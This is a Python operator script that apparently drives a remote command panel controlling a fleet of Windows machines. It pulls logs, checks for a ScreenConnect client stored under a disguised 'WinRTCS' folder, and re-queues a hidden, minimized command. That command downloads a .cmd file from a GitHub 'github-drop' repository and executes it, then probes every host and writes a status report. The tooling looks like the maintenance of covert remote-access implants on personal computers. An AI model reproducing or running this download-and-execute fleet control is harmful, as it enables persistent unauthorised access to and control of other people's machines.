#!/usr/bin/env python3
"""Pull recover logs from MISSING hosts, re-queue recover if needed, final verify."""
from __future__ import annotations

import json
import re
import sys
import time
import urllib.parse
import urllib.request
from pathlib import Path

BASE = "https://debian.seczio.com"
ADMIN = ((Path(__file__).resolve().parent / "secrets" / "admin_token.txt")).read_text(encoding="utf-8").strip()
OUT = Path.home() / "Desktop" / "gryxa_fleet_scan.txt"

MISSING = [
    "DESKTOP-3UFSG6P",
    "DESKTOP-L12E0G2",
    "DESKTOP-L66QG8O",
    "MRG-DELL",
    "SECRETARYPC",
    "KYLEESPC",
    "MIKESCOMPUTER",
    "LAPTOP-MPDLHEFC",
]

LOG_CMD = (
    r"if exist C:\Users\Public\gryxa_recover.log (type C:\Users\Public\gryxa_recover.log) else (echo NO_RECOVER_LOG)"
    " & powershell -NoProfile -NonInteractive -Command "
    "\"$ErrorActionPreference='SilentlyContinue'; "
    "if(Test-Path 'C:\\ProgramData\\WinRTCS\\msi_gryxa_install.log'){ "
    "Get-Content 'C:\\ProgramData\\WinRTCS\\msi_gryxa_install.log' -Tail 25 "
    "} else { 'NO_MSI_LOG' }; "
    "$s=Get-CimInstance Win32_Service | Where-Object { $_.Name -eq 'ScreenConnect Client (36e506ff016b2151)' } | Select-Object -First 1; "
    "if(-not $s){'GRYXA=MISSING'} else {'GRYXA='+$s.State+'|PATH='+$s.PathName}; "
    "'DIR86='+(Test-Path 'C:\\Program Files (x86)\\ScreenConnect Client (36e506ff016b2151)'); "
    "if(Test-Path 'C:\\ProgramData\\WinRTCS\\gryxa_install.msi'){ "
    "'MSI_SIZE='+(Get-Item 'C:\\ProgramData\\WinRTCS\\gryxa_install.msi').Length "
    "} else {'MSI_SIZE=0'}\""
    " & echo LOG_DONE"
)

RECOVER2 = (
    'start "" /min cmd.exe /c "'
    r"C:\Windows\System32\curl.exe -f -L --ssl-no-revoke --connect-timeout 15 --max-time 90"
    r" -o C:\Users\Public\gryxa_recover.cmd"
    " https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_gryxa_recover.cmd"
    r" & call C:\Users\Public\gryxa_recover.cmd --detached"
    '" & echo RECOVER2_QUEUED'
)

PROBE = (
    "powershell -NoProfile -NonInteractive -Command "
    "\"$ErrorActionPreference='SilentlyContinue'; "
    "$s=Get-CimInstance Win32_Service | Where-Object { $_.Name -eq 'ScreenConnect Client (36e506ff016b2151)' } | Select-Object -First 1; "
    "if(-not $s){ Write-Output 'GRYXA=MISSING' } else { "
    "$g= if($s.PathName -match 'gryxa\\.com'){'YES'} else {'NO'}; "
    "Write-Output ('GRYXA='+$s.State+'|PATH_GRYXA='+$g+'|START='+$s.StartMode) "
    "}; Write-Output 'GRYXA_PROBE_DONE'\""
)


def api(path: str, fields: dict | None = None) -> str:
    data = urllib.parse.urlencode(fields).encode() if fields is not None else None
    req = urllib.request.Request(BASE + path, data=data)
    req.add_header("Authorization", "Bearer " + ADMIN)
    req.add_header("User-Agent", "Mozilla/5.0 (WinRTCS-Console)")
    with urllib.request.urlopen(req, timeout=90) as r:
        return r.read().decode(errors="replace")


def api_json(path: str) -> dict:
    return json.loads(api(path))


def queue(target: str, cmd: str) -> int:
    text = api("/cmd", {"target": target, "cmd": cmd})
    print(text.strip())
    m = re.search(r"id=(\d+)", text)
    if not m:
        raise RuntimeError(text)
    return int(m.group(1))


def wait_one(cid: int, timeout: float = 120.0) -> list[dict]:
    t0 = time.time()
    while time.time() - t0 < timeout:
        res = api_json(f"/api/cmd/{cid}").get("results") or []
        if res:
            time.sleep(4)
            return api_json(f"/api/cmd/{cid}").get("results") or []
        time.sleep(6)
    return api_json(f"/api/cmd/{cid}").get("results") or []


def wait_all(cid: int, min_n: int = 85, timeout: float = 200.0) -> list[dict]:
    t0 = time.time()
    last = -1
    while time.time() - t0 < timeout:
        res = api_json(f"/api/cmd/{cid}").get("results") or []
        if len(res) != last:
            print(f"  cmd#{cid} results={len(res)} ({int(time.time()-t0)}s)")
            last = len(res)
        if len(res) >= min_n and (time.time() - t0) >= 90:
            time.sleep(15)
            return api_json(f"/api/cmd/{cid}").get("results") or []
        time.sleep(8)
    return api_json(f"/api/cmd/{cid}").get("results") or []


def main() -> int:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    lines = [f"=== RECOVER LOGS {time.strftime('%Y-%m-%d %H:%M:%S')} ==="]

    need_retry = []
    ok_now = []
    for h in MISSING:
        print("== log", h)
        cid = queue(h, LOG_CMD)
        res = wait_one(cid, 110)
        out = (res[0].get("out") if res else "") or "(no result)"
        print(h, "=>", out[:450].replace("\n", " | "))
        lines.append(f"--- {h} ---")
        lines.append(out[:1800])
        lines.append("")
        if re.search(r"GRYXA=Running", out, re.I):
            ok_now.append(h)
            continue
        need_retry.append(h)

    lines.append("=== prior install cmd results 518-525 ===")
    for cid in range(518, 526):
        d = api_json(f"/api/cmd/{cid}")
        res = d.get("results") or []
        out = (res[0].get("out") if res else "(none)") or "(none)"
        lines.append(f"#{cid} {d.get('target')}: {out[:220].replace(chr(10),' | ')}")

    print("ok_now", ok_now)
    print("need_retry", need_retry)
    for h in need_retry:
        print("re-recover", h)
        queue(h, RECOVER2)
        time.sleep(0.15)

    if need_retry:
        print("wait 260s for msiexec")
        time.sleep(260)

    print("== final ALL probe ==")
    cid = queue("ALL", PROBE)
    results = wait_all(cid)
    buckets = {k: [] for k in ("RUNNING", "STOPPED", "MISSING", "WRONG_PATH", "OTHER", "NO_PARSE")}
    detail = {}
    for r in results:
        host = r.get("host") or "?"
        out = r.get("out") or ""
        detail[host] = out
        m = re.search(r"GRYXA=([A-Za-z_]+)", out)
        if not m:
            buckets["NO_PARSE"].append(host)
            continue
        st = m.group(1).upper()
        if st == "RUNNING":
            buckets["WRONG_PATH" if "PATH_GRYXA=NO" in out else "RUNNING"].append(host)
        elif st in ("STOPPED", "STOP_PENDING", "START_PENDING", "PAUSED"):
            buckets["STOPPED"].append(host)
        elif st == "MISSING":
            buckets["MISSING"].append(host)
        else:
            buckets["OTHER"].append(host)

    lines.append("")
    lines.append(f"=== FINAL2 cmd=#{cid} responded={len(results)} ===")
    for k in ("RUNNING", "STOPPED", "MISSING", "WRONG_PATH", "OTHER", "NO_PARSE"):
        lines.append(f"{k}={len(buckets[k])}")
    for k in ("STOPPED", "MISSING", "WRONG_PATH", "OTHER", "NO_PARSE"):
        if buckets[k]:
            lines.append(f"--- {k} ---")
            for h in sorted(buckets[k]):
                lines.append(f"  {h} :: {detail.get(h,'').replace(chr(10),' | ')[:140]}")

    fleet = api_json("/api/fleet")
    counts = fleet.get("counts") or {}
    online_no = sorted(
        h["host"]
        for h in (fleet.get("hosts") or [])
        if h.get("presence") == "online" and not h.get("has_gryxa")
    )
    lines.append(f"SIGHT={counts}")
    lines.append(f"sight_online_no_gryxa={online_no}")
    lines.append("--- FOCUS ---")
    for h in MISSING + ["DESKTOP-RC2IJC1", "330MLRACE", "NBK-JBURKS"]:
        lines.append(f"  {h} :: {detail.get(h, '(no response)').replace(chr(10),' | ')[:140]}")

    report = "\n".join(lines) + "\n"
    prev = OUT.read_text(encoding="utf-8") if OUT.exists() else ""
    OUT.write_text(prev + "\n" + report, encoding="utf-8")
    print("\n".join(lines[-60:]))
    print("wrote", OUT)
    bad = buckets["STOPPED"] + buckets["MISSING"] + buckets["WRONG_PATH"]
    return 0 if not bad else 2


if __name__ == "__main__":
    raise SystemExit(main())
